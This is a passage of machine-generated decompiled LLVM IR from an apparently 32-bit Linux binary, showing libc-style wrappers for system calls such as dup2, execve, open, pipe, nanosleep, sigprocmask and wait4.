dec_label_pc_804f754:                             ; preds = %dec_label_pc_804f728, %dec_label_pc_804f748
  %v0_804f754 = phi i32 [ %v4_804f73b, %dec_label_pc_804f728 ], [ -1, %dec_label_pc_804f748 ]
  %v2_804f756 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f756, i32* @edx, align 4
  %v2_804f758 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f758, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804f754

; uselistorder directives
  uselistorder i32 %v4_804f73b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f754, { 1, 0 }
}

define i32 @function_804f75c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f75c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f75c = load i32, i32* @ebx, align 4
  store i32 %v0_804f75c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804f76f = call i32 @dup2(i32 %arg1, i32 %arg2)
  store i32 %v2_804f76f, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804f76f, -4095
  br i1 %tmp8, label %dec_label_pc_804f788, label %dec_label_pc_804f77c

dec_label_pc_804f77c:                             ; preds = %dec_label_pc_804f75c
  %v0_804f77c = load i32, i32* %stack_var_-4, align 4
  %v1_804f77c = call i32 @function_804b774(i32 %v0_804f77c)
  %v0_804f781 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f781 = sub i32 0, %v0_804f781
  %v2_804f783 = inttoptr i32 %v1_804f77c to i32*
  store i32 %v1_804f781, i32* %v2_804f783, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f788

dec_label_pc_804f788:                             ; preds = %dec_label_pc_804f75c, %dec_label_pc_804f77c
  %v0_804f788 = phi i32 [ %v2_804f76f, %dec_label_pc_804f75c ], [ -1, %dec_label_pc_804f77c ]
  %v2_804f78c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f78c, i32* @ebx, align 4
  ret i32 %v0_804f788

; uselistorder directives
  uselistorder i32 %v2_804f76f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f788, { 1, 0 }
}

define i32 @function_804f790(i8* %arg1) local_unnamed_addr {
dec_label_pc_804f790:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_1()
  %tmp5 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-4 = alloca i32, align 4
  %v0_804f790 = load i32, i32* @edi, align 4
  store i32 %v0_804f790, i32* %stack_var_-4, align 4
  %v4_804f794 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f794, i32* %edi.global-to-local, align 4
  %v0_804f7a0 = load i32, i32* @ebx, align 4
  %v5_804f7a8 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_804f7a8 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_804f7a8 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_804f7a8, [1 x i8*] %v8_804f7a8)
  store i32 %v9_804f7a8, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_804f7a8, -4095
  br i1 %tmp12, label %dec_label_pc_804f7c0, label %dec_label_pc_804f7b4

dec_label_pc_804f7b4:                             ; preds = %dec_label_pc_804f790
  %v1_804f7b4 = call i32 @function_804b774(i32 %v0_804f7a0)
  %v0_804f7b9 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f7b9 = sub i32 0, %v0_804f7b9
  %v2_804f7bb = inttoptr i32 %v1_804f7b4 to i32*
  store i32 %v1_804f7b9, i32* %v2_804f7bb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f7c0

dec_label_pc_804f7c0:                             ; preds = %dec_label_pc_804f790, %dec_label_pc_804f7b4
  %v0_804f7c0 = phi i32 [ %v9_804f7a8, %dec_label_pc_804f790 ], [ -1, %dec_label_pc_804f7b4 ]
  %v2_804f7c4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f7c4, i32* %edi.global-to-local, align 4
  ret i32 %v0_804f7c0

; uselistorder directives
  uselistorder i32 %v9_804f7a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f7c0, { 1, 0 }
}

define i32 @function_804f7c8() local_unnamed_addr {
dec_label_pc_804f7c8:
  %stack_var_-8 = alloca i32, align 4
  %v2_804f7cb = ptrtoint i32* %stack_var_-8 to i32
  %v2_804f7d2 = call i32 @function_804f868(i32 7, i32 %v2_804f7cb)
  store i32 256, i32* @edx, align 4
  %v2_804f7df = icmp slt i32 %v2_804f7d2, 0
  br i1 %v2_804f7df, label %dec_label_pc_804f7e7, label %dec_label_pc_804f7e3

dec_label_pc_804f7e3:                             ; preds = %dec_label_pc_804f7c8
  %v3_804f7e3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804f7e3, i32* @edx, align 4
  br label %dec_label_pc_804f7e7

dec_label_pc_804f7e7:                             ; preds = %dec_label_pc_804f7c8, %dec_label_pc_804f7e3
  %v0_804f7e7 = phi i32 [ 256, %dec_label_pc_804f7c8 ], [ %v3_804f7e3, %dec_label_pc_804f7e3 ]
  ret i32 %v0_804f7e7

; uselistorder directives
  uselistorder label %dec_label_pc_804f7e7, { 1, 0 }
}

define i32 @function_804f7f0() local_unnamed_addr {
dec_label_pc_804f7f0:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f7f0 = load i32, i32* @ebx, align 4
  store i32 %v0_804f7f0, i32* %stack_var_-4, align 4
  %v1_804f7f9 = call i32 @int80_syscall(i32 202)
  store i32 %v1_804f7f9, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804f7f9, -4095
  br i1 %tmp6, label %dec_label_pc_804f810, label %dec_label_pc_804f804

dec_label_pc_804f804:                             ; preds = %dec_label_pc_804f7f0
  %v0_804f804 = load i32, i32* %stack_var_-4, align 4
  %v1_804f804 = call i32 @function_804b774(i32 %v0_804f804)
  %v0_804f809 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f809 = sub i32 0, %v0_804f809
  %v2_804f80b = inttoptr i32 %v1_804f804 to i32*
  store i32 %v1_804f809, i32* %v2_804f80b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f810

dec_label_pc_804f810:                             ; preds = %dec_label_pc_804f7f0, %dec_label_pc_804f804
  %v0_804f810 = phi i32 [ %v1_804f7f9, %dec_label_pc_804f7f0 ], [ -1, %dec_label_pc_804f804 ]
  %v2_804f814 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f814, i32* @ebx, align 4
  ret i32 %v0_804f810

; uselistorder directives
  uselistorder i32 %v1_804f7f9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f810, { 1, 0 }
}

define i32 @function_804f818() local_unnamed_addr {
dec_label_pc_804f818:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f818 = load i32, i32* @ebx, align 4
  store i32 %v0_804f818, i32* %stack_var_-4, align 4
  %v1_804f821 = call i32 @int80_syscall(i32 201)
  store i32 %v1_804f821, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804f821, -4095
  br i1 %tmp6, label %dec_label_pc_804f838, label %dec_label_pc_804f82c

dec_label_pc_804f82c:                             ; preds = %dec_label_pc_804f818
  %v0_804f82c = load i32, i32* %stack_var_-4, align 4
  %v1_804f82c = call i32 @function_804b774(i32 %v0_804f82c)
  %v0_804f831 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f831 = sub i32 0, %v0_804f831
  %v2_804f833 = inttoptr i32 %v1_804f82c to i32*
  store i32 %v1_804f831, i32* %v2_804f833, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f838

dec_label_pc_804f838:                             ; preds = %dec_label_pc_804f818, %dec_label_pc_804f82c
  %v0_804f838 = phi i32 [ %v1_804f821, %dec_label_pc_804f818 ], [ -1, %dec_label_pc_804f82c ]
  %v2_804f83c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f83c, i32* @ebx, align 4
  ret i32 %v0_804f838

; uselistorder directives
  uselistorder i32 %v1_804f821, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f838, { 1, 0 }
}

define i32 @function_804f840() local_unnamed_addr {
dec_label_pc_804f840:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f840 = load i32, i32* @ebx, align 4
  store i32 %v0_804f840, i32* %stack_var_-4, align 4
  %v1_804f849 = call i32 @int80_syscall(i32 200)
  store i32 %v1_804f849, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804f849, -4095
  br i1 %tmp6, label %dec_label_pc_804f860, label %dec_label_pc_804f854

dec_label_pc_804f854:                             ; preds = %dec_label_pc_804f840
  %v0_804f854 = load i32, i32* %stack_var_-4, align 4
  %v1_804f854 = call i32 @function_804b774(i32 %v0_804f854)
  %v0_804f859 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f859 = sub i32 0, %v0_804f859
  %v2_804f85b = inttoptr i32 %v1_804f854 to i32*
  store i32 %v1_804f859, i32* %v2_804f85b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f860

dec_label_pc_804f860:                             ; preds = %dec_label_pc_804f840, %dec_label_pc_804f854
  %v0_804f860 = phi i32 [ %v1_804f849, %dec_label_pc_804f840 ], [ -1, %dec_label_pc_804f854 ]
  %v2_804f864 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f864, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804f860

; uselistorder directives
  uselistorder i32 %v1_804f849, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f860, { 1, 0 }
}

define i32 @function_804f868(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f868:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f868 = load i32, i32* @ebx, align 4
  store i32 %v0_804f868, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804f87b = call i32 @int80_syscall(i32 191)
  store i32 %v1_804f87b, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804f87b, -4095
  br i1 %tmp8, label %dec_label_pc_804f894, label %dec_label_pc_804f888

dec_label_pc_804f888:                             ; preds = %dec_label_pc_804f868
  %v0_804f888 = load i32, i32* %stack_var_-4, align 4
  %v1_804f888 = call i32 @function_804b774(i32 %v0_804f888)
  %v0_804f88d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f88d = sub i32 0, %v0_804f88d
  %v2_804f88f = inttoptr i32 %v1_804f888 to i32*
  store i32 %v1_804f88d, i32* %v2_804f88f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f894

dec_label_pc_804f894:                             ; preds = %dec_label_pc_804f868, %dec_label_pc_804f888
  %v0_804f894 = phi i32 [ %v1_804f87b, %dec_label_pc_804f868 ], [ -1, %dec_label_pc_804f888 ]
  %v2_804f898 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f898, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804f894

; uselistorder directives
  uselistorder i32 %v1_804f87b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f894, { 1, 0 }
}

define i32 @function_804f89c() local_unnamed_addr {
dec_label_pc_804f89c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f89c = load i32, i32* @ebx, align 4
  store i32 %v0_804f89c, i32* %stack_var_-4, align 4
  %v1_804f8a5 = call i32 @int80_syscall(i32 199)
  store i32 %v1_804f8a5, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804f8a5, -4095
  br i1 %tmp6, label %dec_label_pc_804f8bc, label %dec_label_pc_804f8b0

dec_label_pc_804f8b0:                             ; preds = %dec_label_pc_804f89c
  %v0_804f8b0 = load i32, i32* %stack_var_-4, align 4
  %v1_804f8b0 = call i32 @function_804b774(i32 %v0_804f8b0)
  %v0_804f8b5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f8b5 = sub i32 0, %v0_804f8b5
  %v2_804f8b7 = inttoptr i32 %v1_804f8b0 to i32*
  store i32 %v1_804f8b5, i32* %v2_804f8b7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f8bc

dec_label_pc_804f8bc:                             ; preds = %dec_label_pc_804f89c, %dec_label_pc_804f8b0
  %v0_804f8bc = phi i32 [ %v1_804f8a5, %dec_label_pc_804f89c ], [ -1, %dec_label_pc_804f8b0 ]
  %v2_804f8c0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f8c0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804f8bc

; uselistorder directives
  uselistorder i32 %v1_804f8a5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f8bc, { 1, 0 }
}

define i32 @function_804f904(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f904:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f904 = load i32, i32* @ebx, align 4
  store i32 %v0_804f904, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_804f917 = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_804f917, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_804f917, -4095
  br i1 %tmp9, label %dec_label_pc_804f930, label %dec_label_pc_804f924

dec_label_pc_804f924:                             ; preds = %dec_label_pc_804f904
  %v0_804f924 = load i32, i32* %stack_var_-4, align 4
  %v1_804f924 = call i32 @function_804b774(i32 %v0_804f924)
  %v0_804f929 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f929 = sub i32 0, %v0_804f929
  %v2_804f92b = inttoptr i32 %v1_804f924 to i32*
  store i32 %v1_804f929, i32* %v2_804f92b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f930

dec_label_pc_804f930:                             ; preds = %dec_label_pc_804f904, %dec_label_pc_804f924
  %v0_804f930 = phi i32 [ %v3_804f917, %dec_label_pc_804f904 ], [ -1, %dec_label_pc_804f924 ]
  %v2_804f932 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f932, i32* @edx, align 4
  %v2_804f934 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f934, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804f930

; uselistorder directives
  uselistorder i32 %v3_804f917, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f930, { 1, 0 }
}

define i32 @function_804f938(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f938:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-4 = alloca i32, align 4
  %v0_804f938 = load i32, i32* @ebx, align 4
  store i32 %v0_804f938, i32* %stack_var_-4, align 4
  %v4_804f93c = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_804f93c, i32* %ebx.global-to-local, align 4
  %v6_804f94b = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_804f94b, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v6_804f94b, -4095
  br i1 %tmp10, label %dec_label_pc_804f964, label %dec_label_pc_804f958

dec_label_pc_804f958:                             ; preds = %dec_label_pc_804f938
  %v0_804f958 = load i32, i32* %stack_var_-4, align 4
  %v1_804f958 = call i32 @function_804b774(i32 %v0_804f958)
  %v0_804f95d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f95d = sub i32 0, %v0_804f95d
  %v2_804f95f = inttoptr i32 %v1_804f958 to i32*
  store i32 %v1_804f95d, i32* %v2_804f95f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f964

dec_label_pc_804f964:                             ; preds = %dec_label_pc_804f938, %dec_label_pc_804f958
  %v0_804f964 = phi i32 [ %v6_804f94b, %dec_label_pc_804f938 ], [ -1, %dec_label_pc_804f958 ]
  %v2_804f968 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f968, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804f964

; uselistorder directives
  uselistorder i32 %v6_804f94b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f964, { 1, 0 }
}

define i32 @function_804f96c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804f96c:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804f96d = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804f973 = sdiv i32 %sext, 16777216
  store i32 %v4_804f973, i32* @ecx, align 4
  %v4_804f977 = ptrtoint i8* %arg1 to i32
  %v3_804f97b = and i32 %arg2, 64
  %v4_804f97b = icmp eq i32 %v3_804f97b, 0
  br i1 %v4_804f97b, label %dec_label_pc_804f98c, label %dec_label_pc_804f980

dec_label_pc_804f980:                             ; preds = %dec_label_pc_804f96c
  %phitmp = urem i32 %arg3, 65536
  br label %dec_label_pc_804f98c

dec_label_pc_804f98c:                             ; preds = %dec_label_pc_804f96c, %dec_label_pc_804f980
  %v0_804f98c = phi i32 [ 0, %dec_label_pc_804f96c ], [ %phitmp, %dec_label_pc_804f980 ]
  store i32 %v0_804f98c, i32* @edx, align 4
  store i32 %v4_804f977, i32* %ebx.global-to-local, align 4
  %v5_804f997 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804f973)
  store i32 %v5_804f997, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_804f997, -4095
  br i1 %tmp15, label %dec_label_pc_804f9af, label %dec_label_pc_804f9a3

dec_label_pc_804f9a3:                             ; preds = %dec_label_pc_804f98c
  %v1_804f9a3 = call i32 @function_804b774(i32 %v0_804f96d)
  %v0_804f9a8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f9a8 = sub i32 0, %v0_804f9a8
  %v2_804f9aa = inttoptr i32 %v1_804f9a3 to i32*
  store i32 %v1_804f9a8, i32* %v2_804f9aa, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f9af

dec_label_pc_804f9af:                             ; preds = %dec_label_pc_804f98c, %dec_label_pc_804f9a3
  %v0_804f9af = phi i32 [ %v5_804f997, %dec_label_pc_804f98c ], [ -1, %dec_label_pc_804f9a3 ]
  store i32 %v0_804f96d, i32* @ebx, align 4
  ret i32 %v0_804f9af

; uselistorder directives
  uselistorder i32 %v5_804f997, { 1, 0, 2 }
  uselistorder i32 %v4_804f973, { 1, 0 }
  uselistorder i32 %v0_804f96d, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804f9af, { 1, 0 }
  uselistorder label %dec_label_pc_804f98c, { 1, 0 }
}

define i32 @function_804f9b7(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f9b7:
  %v3_804f9c7 = inttoptr i32 %arg1 to i8*
  %v4_804f9c7 = call i32 @function_804f96c(i8* %v3_804f9c7, i32 577, i32 %arg2)
  ret i32 %v4_804f9c7

; uselistorder directives
  uselistorder i32 (i8*, i32, i32)* @function_804f96c, { 0, 2, 1 }
  uselistorder i32 577, { 1, 0, 2 }
}

define i32 @function_804f9d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f9d0:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f9d0 = load i32, i32* @edi, align 4
  store i32 %v0_804f9d0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804f9d8 = load i32, i32* @ebx, align 4
  %v1_804f9e0 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_804f9e0 = call i32 @pipe([2 x i32] %v1_804f9e0)
  store i32 %v0_804f9d8, i32* @ebx, align 4
  store i32 %v2_804f9e0, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804f9e0, -4095
  br i1 %tmp8, label %dec_label_pc_804f9f8, label %dec_label_pc_804f9ec

dec_label_pc_804f9ec:                             ; preds = %dec_label_pc_804f9d0
  %v1_804f9ec = call i32 @function_804b774(i32 %v0_804f9d8)
  %v0_804f9f1 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f9f1 = sub i32 0, %v0_804f9f1
  %v2_804f9f3 = inttoptr i32 %v1_804f9ec to i32*
  store i32 %v1_804f9f1, i32* %v2_804f9f3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f9f8

dec_label_pc_804f9f8:                             ; preds = %dec_label_pc_804f9d0, %dec_label_pc_804f9ec
  %v0_804f9f8 = phi i32 [ %v2_804f9e0, %dec_label_pc_804f9d0 ], [ -1, %dec_label_pc_804f9ec ]
  %v2_804f9fc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f9fc, i32* @edi, align 4
  ret i32 %v0_804f9f8

; uselistorder directives
  uselistorder i32 %v2_804f9e0, { 1, 0, 2 }
  uselistorder i32 %v0_804f9d8, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f9f8, { 1, 0 }
}

define i32 @function_804fa00(i32 %arg1) local_unnamed_addr {
dec_label_pc_804fa00:
  %stack_var_-12 = alloca i32, align 4
  %v0_804fa01 = load i32, i32* @ebx, align 4
  %v0_804fa05 = load i32, i32* @global_var_8058784.184, align 4
  %v1_804fa05 = icmp eq i32 %v0_804fa05, 0
  %v1_804fa10 = icmp eq i1 %v1_804fa05, false
  br i1 %v1_804fa10, label %dec_label_pc_804fa23, label %dec_label_pc_804fa12

dec_label_pc_804fa12:                             ; preds = %dec_label_pc_804fa00
  %v1_804fa17 = call i32 @function_80512e8(i32 0)
  %v2_804fa1f = icmp slt i32 %v1_804fa17, 0
  br i1 %v2_804fa1f, label %dec_label_pc_804fa45, label %dec_label_pc_804fa12.dec_label_pc_804fa23_crit_edge

dec_label_pc_804fa12.dec_label_pc_804fa23_crit_edge: ; preds = %dec_label_pc_804fa12
  %v0_804fa25.pre = load i32, i32* @global_var_8058784.184, align 4
  br label %dec_label_pc_804fa23

dec_label_pc_804fa23:                             ; preds = %dec_label_pc_804fa12.dec_label_pc_804fa23_crit_edge, %dec_label_pc_804fa00
  %v0_804fa33 = phi i32 [ %v0_804fa25.pre, %dec_label_pc_804fa12.dec_label_pc_804fa23_crit_edge ], [ %v0_804fa05, %dec_label_pc_804fa00 ]
  %v1_804fa23 = icmp eq i32 %arg1, 0
  %v1_804fa2a = icmp eq i1 %v1_804fa23, false
  br i1 %v1_804fa2a, label %dec_label_pc_804fa30, label %dec_label_pc_804fa2c

dec_label_pc_804fa2c:                             ; preds = %dec_label_pc_804fa23
  br label %dec_label_pc_804fa48

dec_label_pc_804fa30:                             ; preds = %dec_label_pc_804fa23
  store i32 %v0_804fa33, i32* @ebx, align 4
  %v2_804fa35 = add i32 %v0_804fa33, %arg1
  %v1_804fa39 = call i32 @function_80512e8(i32 %v2_804fa35)
  %v2_804fa41 = icmp slt i32 %v1_804fa39, 0
  %v1_804fa43 = icmp eq i1 %v2_804fa41, false
  br i1 %v1_804fa43, label %dec_label_pc_804fa30.dec_label_pc_804fa48_crit_edge, label %dec_label_pc_804fa45

dec_label_pc_804fa30.dec_label_pc_804fa48_crit_edge: ; preds = %dec_label_pc_804fa30
  %v0_804fa48.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804fa48

dec_label_pc_804fa45:                             ; preds = %dec_label_pc_804fa30, %dec_label_pc_804fa12
  br label %dec_label_pc_804fa48

dec_label_pc_804fa48:                             ; preds = %dec_label_pc_804fa30.dec_label_pc_804fa48_crit_edge, %dec_label_pc_804fa2c, %dec_label_pc_804fa45
  %v0_804fa48 = phi i32 [ %v0_804fa48.pre, %dec_label_pc_804fa30.dec_label_pc_804fa48_crit_edge ], [ %v0_804fa33, %dec_label_pc_804fa2c ], [ -1, %dec_label_pc_804fa45 ]
  %v2_804fa4a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fa4a, i32* @edx, align 4
  store i32 %v0_804fa01, i32* @ebx, align 4
  ret i32 %v0_804fa48

; uselistorder directives
  uselistorder i32 %v0_804fa33, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_80512e8, { 1, 0 }
  uselistorder label %dec_label_pc_804fa48, { 2, 0, 1 }
}

define i32 @function_804fa50(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fa50:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804fa51 = load i32, i32* @esi, align 4
  %v4_804fa55 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804fa55, i32* @ecx, align 4
  %v2_804fa61 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804fa61, label %dec_label_pc_804fa7a, label %dec_label_pc_804fa65

dec_label_pc_804fa65:                             ; preds = %dec_label_pc_804fa50
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_804fa7a, label %dec_label_pc_804fa6a

dec_label_pc_804fa6a:                             ; preds = %dec_label_pc_804fa65
  %v1_804fa6a = call i32 @function_804b774(i32 %v0_804fa51)
  %v1_804fa6f = inttoptr i32 %v1_804fa6a to i32*
  store i32 22, i32* %v1_804fa6f, align 4
  br label %dec_label_pc_804faa1

dec_label_pc_804fa7a:                             ; preds = %dec_label_pc_804fa65, %dec_label_pc_804fa50
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804fa7f = load i32, i32* @ebx, align 4
  %v7_804fa87 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp4)
  store i32 %v0_804fa7f, i32* @ebx, align 4
  store i32 %v7_804fa87, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_804fa87, -4095
  br i1 %tmp13, label %dec_label_pc_804faa1, label %dec_label_pc_804fa93

dec_label_pc_804fa93:                             ; preds = %dec_label_pc_804fa7a
  %v1_804fa93 = call i32 @function_804b774(i32 %v0_804fa7f)
  %v0_804fa98 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fa98 = sub i32 0, %v0_804fa98
  %v2_804fa9a = inttoptr i32 %v1_804fa93 to i32*
  store i32 %v1_804fa98, i32* %v2_804fa9a, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804faa1

dec_label_pc_804faa1:                             ; preds = %dec_label_pc_804fa93, %dec_label_pc_804fa7a, %dec_label_pc_804fa6a
  %storemerge = phi i32 [ -1, %dec_label_pc_804fa6a ], [ %v7_804fa87, %dec_label_pc_804fa7a ], [ -1, %dec_label_pc_804fa93 ]
  %v2_804faa1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804faa1, i32* @edx, align 4
  store i32 %v0_804fa51, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804fa87, { 1, 0, 2 }
  uselistorder i32 %v0_804fa7f, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_804faa8(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* %arg4) local_unnamed_addr {
dec_label_pc_804faa8:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804faa9 = load i32, i32* @esi, align 4
  store i32 %v0_804faa9, i32* %stack_var_-8, align 4
  %v4_804fab9 = ptrtoint %rusage* %arg4 to i32
  store i32 %v4_804fab9, i32* %esi.global-to-local, align 4
  %v0_804fabd = load i32, i32* @ebx, align 4
  %v6_804fac5 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* %arg4)
  store i32 %v0_804fabd, i32* @ebx, align 4
  store i32 %v6_804fac5, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_804fac5, -4095
  br i1 %tmp11, label %dec_label_pc_804fadd, label %dec_label_pc_804fad1

dec_label_pc_804fad1:                             ; preds = %dec_label_pc_804faa8
  %v1_804fad1 = call i32 @function_804b774(i32 %v0_804fabd)
  %v0_804fad6 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fad6 = sub i32 0, %v0_804fad6
  %v2_804fad8 = inttoptr i32 %v1_804fad1 to i32*
